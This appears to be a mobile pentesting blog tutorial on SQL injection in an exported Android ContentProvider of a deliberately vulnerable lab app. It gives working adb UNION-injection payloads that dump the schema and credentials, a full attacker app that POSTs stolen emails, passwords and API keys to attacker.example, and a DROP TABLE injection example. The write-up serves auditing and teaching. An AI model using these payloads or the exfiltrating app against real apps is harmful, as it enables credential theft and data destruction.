---
title: Android - SQL Injection in a ContentProvider
author: nirajkharel
date: 2026-06-03 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, ContentProvider, SQL Injection]
render_with_liquid: false
---


ContentProviders that back onto SQLite and accept caller-supplied `selection` / `selectionArgs` / `sortOrder` parameters without parameterization are vulnerable to classic SQL injection. The attack surface is narrower than a web SQLi, you usually only get UNION-style data exfiltration through the cursor, but on an exported provider, any installed app can issue queries that read tables they were never meant to see.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/providers/VulnContentProvider.java</code> (query method)</li>
  </ul>
</aside>

<br>**The shape**

This is `VulnContentProvider`'s `query()` method - the method every `ContentResolver.query()` call from any app on the device eventually lands in, once the provider is reachable. Four things in it are worth stopping on, marked **1** through **4** below:

<img alt="Annotated VulnContentProvider.query() showing four SQL-injection points" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-query-annotated.png">

**Highlight 1** is where the table name comes from. `uri.getLastPathSegment()` takes whatever the caller put at the end of the `content://` URI - the `/users` in `content://com.vulnlab.app.provider/users` - and uses it as-is as the table name. Why would a developer write it this way? Because it's a convenient way to let one `query()` method serve multiple tables without writing a `query()` per table - `/users` hits the `users` table, `/sessions` hits `sessions`, one switch avoided. The `if (table == null) table = "users"` fallback is a default, not a check - it never verifies that whatever *did* come through is one of the tables the provider intended to expose.

**Highlight 2** is the actual injection point. `selection` is the raw string the caller passed as the `--where` argument (or the `selection` parameter of `ContentResolver.query()`). Does the developer parameterize it? No - they string-concatenate it directly after the literal `" WHERE "`. This is exactly the same mistake as building a SQL string with `+` in a Java servlet, just relocated to Android IPC. The comment in the source even says so - `// VULN: raw attacker string in SQL` - the developer (in this deliberately vulnerable lab app) left themselves a note about it.

**Highlight 3** is where highlights 1 and 2 combine. `"SELECT * FROM " + table + where` builds the final SQL string by gluing together an attacker-influenced table name and an attacker-controlled WHERE clause onto a fixed `SELECT *`. Nothing here is bound - it's pure string concatenation, three untrusted-adjacent pieces stitched into one statement.

**Highlight 4** is the part that actually matters for exploitability: how the query executes. `db.rawQuery(query, null)` runs the fully-built string as SQL, and passes `null` for the bind arguments. That `null` is the tell - if the developer had used `selectionArgs` correctly, this argument would carry the untrusted values as parameters and SQLite would bind them safely, string content and all, no matter what the attacker put in `selection`. Passing `null` here means every character of `selection` gets interpreted as SQL syntax, not as a literal string. That's the whole bug in one method argument.

Three injectable parameters fall out of this:

**Selection** (highlight 2), concatenated into the WHERE clause. Standard SQLi.

**Table name** (highlight 1), taken from the URI path with no allowlist. Attacker reads tables never meant to be exposed through this authority (`users`, `sessions`).

**Projection**, not exploitable here because `rawQuery` ignores the `projection` parameter entirely - but worth checking on every other provider you audit, because a variant that passes `projection` straight into `db.query()` will accept a subquery in place of a column name: `(SELECT password FROM users WHERE id=1)`.

<br>**Identifying it**

Start in `AndroidManifest.xml` - same as any provider bug, it's where you get the `authority` and the reachability. Three attributes on this declaration decide whether the injectable code you'll find in a minute is reachable at all:

<style>
.cb-wrap{margin:24px 0;padding:40px 48px;border-radius:14px;background:linear-gradient(135deg,#7c6fd6 0%,#4a63c9 50%,#3a7bd5 100%);}
.cb-card{position:relative;background:#1e1f26;border-radius:10px;box-shadow:0 20px 40px rgba(0,0,0,0.35);overflow:visible;padding-bottom:20px;}
.cb-titlebar{display:flex;align-items:center;gap:8px;padding:12px 16px 8px 16px;}
.cb-dot{width:12px;height:12px;border-radius:50%;display:inline-block;}
.cb-dot.red{background:#ff5f56;}
.cb-dot.yellow{background:#ffbd2e;}
.cb-dot.green{background:#27c93f;}
.cb-code{font-family:"Menlo","SF Mono","Fira Code",monospace;font-size:15px;line-height:24px;padding:8px 44px 16px 28px;white-space:pre;overflow-x:auto;color:#e6e6e6;}
.cb-code .cb-line{display:block;}
.cb-kw{color:#ff79c6;}
.cb-type{color:#8be9fd;}
.cb-ann{color:#f1fa8c;}
.cb-str{color:#f5d76e;}
.cb-cm{color:#6b7280;font-style:italic;}
.cb-met{color:#50fa7b;}
.cb-hlbox{position:relative;margin:4px 0;padding:4px 8px;border:2px solid #ff5f56;border-radius:6px;background:rgba(255,95,86,0.06);}
.cb-badge{position:absolute;right:-34px;top:50%;transform:translateY(-50%);width:24px;height:24px;border-radius:50%;background:#ff5f56;color:#1e1f26;font-family:"Menlo","SF Mono",monospace;font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,0.4);}
@media (max-width:700px){.cb-wrap{padding:16px;}.cb-badge{position:static;transform:none;display:inline-flex;margin-left:8px;}}
</style>

<div class="cb-wrap">
  <div class="cb-card">
    <div class="cb-titlebar">
      <span class="cb-dot red"></span>
      <span class="cb-dot yellow"></span>
      <span class="cb-dot green"></span>
    </div>
    <div class="cb-code">
<span class="cb-line">&lt;<span class="cb-kw">provider</span></span>
<span class="cb-line">    <span class="cb-ann">android:name</span>=<span class="cb-str">".providers.VulnContentProvider"</span></span>
<div class="cb-hlbox">
<span class="cb-line">    <span class="cb-ann">android:authorities</span>=<span class="cb-str">"com.vulnlab.app.provider"</span></span>
<div class="cb-badge">1</div>
</div>
<div class="cb-hlbox">
<span class="cb-line">    <span class="cb-ann">android:exported</span>=<span class="cb-str">"true"</span></span>
<div class="cb-badge">2</div>
</div>
<div class="cb-hlbox">
<span class="cb-line">    <span class="cb-ann">android:grantUriPermissions</span>=<span class="cb-str">"true"</span> /&gt;</span>
<div class="cb-badge">3</div>
</div>
    </div>
  </div>
</div>

**Highlight 1**, `android:authorities`, is the host of every `content://` URI you'll query against this provider - `content://com.vulnlab.app.provider/...`. It's also the string `android:name` maps to the class you open next in the decompile, `VulnContentProvider`, where the injectable `query()` method from the previous section lives.

**Highlight 2**, `android:exported="true"`, is the attribute that decides whether any of this matters. Does an exported provider mean any app can query it? Yes, by default - `exported="true"` with no `android:readPermission` means every installed app, no shared signature, no special permission, can call `ContentResolver.query()` against this authority and reach the vulnerable code. Flip this to `false`, or gate it behind a `signature`-level permission, and the injection becomes unreachable from outside the app - still a bug, but no longer a bug a third-party app can trigger.

**Highlight 3**, `android:grantUriPermissions="true"`, is easy to skim past because it doesn't look related to SQL injection at all. It isn't, directly - but it means this provider can also hand out temporary access grants on specific URIs to apps that would otherwise be blocked, which matters when you're chaining this provider with other primitives (the path-traversal `openFile()` bug in this same class, for one). Worth noting when you see it, even if it's not the attribute doing the work in this particular finding.

With the authority and class name in hand, grep the decompile for that class's `query` implementation:

```bash
grep -rn '@Override.*public Cursor query' decompile/
```

For each, check:

```java
db.query(table, projection, selection, selectionArgs, ...);   // mostly safe if selectionArgs used
db.rawQuery(sql, args);                                       // potentially dangerous depending on sql
db.execSQL(stmt);                                             // dangerous
sqlBuilder.appendWhere(...);                                  // dangerous if input is concatenated
```

The vulnerability is when the parameters that go into the WHERE clause (or projection, or table name) are concatenated from attacker input rather than passed as `selectionArgs` (which SQLite binds safely).

Runtime hook on the vulnerable class directly:

```javascript
Java.perform(function () {
  const VP = Java.use('com.vulnlab.app.providers.VulnContentProvider');
  VP.query.implementation = function (uri, proj, sel, selArgs, sort) {
    console.log('[VulnContentProvider.query] uri=' + uri + ' selection=' + sel);
    return this.query(uri, proj, sel, selArgs, sort);
  };
});
```

Fire the probes below via `adb` and watch what concatenated SQL the provider actually builds (also visible in logcat under tag `VulnProvider`).

<br>**Confirming it, and shaping the query**

Before writing any exploit, three things have to be answered: is the `selection` actually evaluated as SQL, how many columns does the base query return, and what tables and columns exist. Black-box you derive each in turn; with the lab source you read them straight off the `CREATE TABLE` and skip ahead.

One quoting gotcha first: `adb shell` hands the command to a *second* shell on the device, which re-splits on spaces. A multi-word `--where` like `1=0 UNION SELECT 1` arrives as separate tokens and `content` rejects `UNION` as an unknown argument. Wrap the clause in single quotes *inside* the double quotes so the device shell keeps it as one token. (Those single quotes are the shell's, not SQL's - fine while the payload contains no `'`; when it does, run the query from the attacker app instead, where no second shell mangles it.)

**Is it injectable.** A boolean pair - the row count flips only if your string is parsed as SQL, not bound (`1=1` / `1=2` are single tokens, so they need no extra quoting):

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "1=1"   # all rows

adb shell content query --uri content://com.vulnlab.app.provider/users --where "1=2"   # none
```

A dangling keyword forces a syntax error - proof the clause is concatenated into a parsed statement, not bound as a literal:

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=1 AND'"   # SQLiteException in logcat
```

**How many columns.** The provider runs `SELECT * FROM users`, so a `UNION` has to supply the *same* column count. Walk it up until the syntax error clears:

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=0 UNION SELECT 1'"

adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=0 UNION SELECT 1,2,3,4,5'"   # clears → 5 columns
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-1.png">

`1=0` keeps the base rows out so only the injected row returns. `ORDER BY 6` works too - it errors while the ordinal exceeds the column count.

**What tables and columns.** With the count known, pull the schema from `sqlite_master` - `name` is the table, `sql` is its full `CREATE TABLE`:

```bash
adb shell content query \
    --uri content://com.vulnlab.app.provider/users \
    --where "'1=0 UNION SELECT name,sql,3,4,5 FROM sqlite_master'"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-2.png">

That hands you every table, every column, every constraint - which is where `users(id, email, password, role, api_key)` comes from. The exploit query just fills the five slots with the columns worth stealing:

```
1=1 UNION SELECT id, email, password, role, api_key FROM users
```

So the attacker app's hardcoded `UNION` below isn't a guess - it's the output of these three steps.

<br>**Attacker app**

The attacker app does three things. It builds the `content://` URI for the target table. It calls `getContentResolver().query(...)` with a malicious `selection` - `1=1 UNION SELECT ...` - which the provider concatenates straight into its `SELECT`, so the cursor comes back carrying whatever columns the injected query named. It walks that cursor and ships the rows to a server the attacker controls, on a background thread so the query doesn't block the UI:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = Uri.parse("content://com.vulnlab.app.provider/users");

        // injected UNION pulls admin creds + API keys from the same table
        Cursor c = getContentResolver().query(
            uri,
            null,
            "1=1 UNION SELECT id, email, password, role, api_key FROM users",
            null,
            null);

        StringBuilder out = new StringBuilder();
        if (c != null) {
            while (c.moveToNext()) {
                out.append(c.getString(1)).append('|')      // email
                   .append(c.getString(2)).append('|')      // password
                   .append(c.getString(4)).append('\n');    // api_key
            }
            c.close();
        }

        new Thread(() -> {                           // exfiltrate off the main thread
            try {
                new OkHttpClient().newCall(new Request.Builder()
                    .url("https://attacker.example/")
                    .post(RequestBody.create(out.toString().getBytes()))
                    .build()).execute();
            } catch (IOException ignored) {}
        }).start();
    }
}
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-3.png">

The injected `UNION SELECT` returns admin credentials and API keys from the same table, and the attacker POSTs them out with no prompt and nothing on screen. Variant: read tables the provider was never meant to expose by changing the URI path segment (e.g. `/sessions`).

The same dump straight from `adb`, no attacker app needed:

```bash
adb shell content query \
    --uri content://com.vulnlab.app.provider/users \
    --where "'1=1 UNION SELECT id, email, password, role, api_key FROM users'"
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-4.png">

<br>**The "but selectionArgs is safe" objection**

True if used. Many apps build the selection string by concatenation but then pass an empty `selectionArgs`. The `selectionArgs` parameter exists, it is just unused. The concatenated `selection` is the injection point.

A second variant, seen on other providers in the wild rather than this one: the developer passes `selectionArgs` correctly for some query paths and not others, e.g. a provider with a `switch` on URI path that routes to several table-specific queries, one of which was written by someone who didn't get the memo. The audit step is reading every branch, not just the first one you find.

<br>**The execSQL escalation, write primitive**

`VulnContentProvider`'s own `update()`/`insert()`/`delete()` are no-op stubs (`return 0` / `null`) — there's no write primitive in this lab app. But it's common enough in the wild to be worth knowing the shape. If a provider exposes `update`, `insert`, or `delete` via concatenated SQL instead of stubbing them out, you get a write primitive:

```java
// Hypothetical — not present in VulnContentProvider
@Override
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
    String sql = "UPDATE users SET name = '" + values.getAsString("name") +
                 "' WHERE id = " + uri.getLastPathSegment();
    db.execSQL(sql);
    return 1;
}
```

The URI segment is concatenated into the WHERE. Attacker passes `1; DROP TABLE users; --` as the path segment. The `execSQL` runs both statements (on some SQLite configurations, depends on whether multi-statement is enabled).

Even without multi-statement, the attacker can update arbitrary rows by injecting into the WHERE: `id = 1 OR 1=1` updates every row.


<br>**Closing**

ContentProvider SQL injection is the classic web bug translated to IPC. The grep is on `SQLiteDatabase.query` / `rawQuery` / `execSQL` calls inside provider classes. The exploit is the standard UNION-SELECT one. Always check whether `selectionArgs` is actually used or just passed empty alongside a concatenated `selection`.

Happy Hacking !!
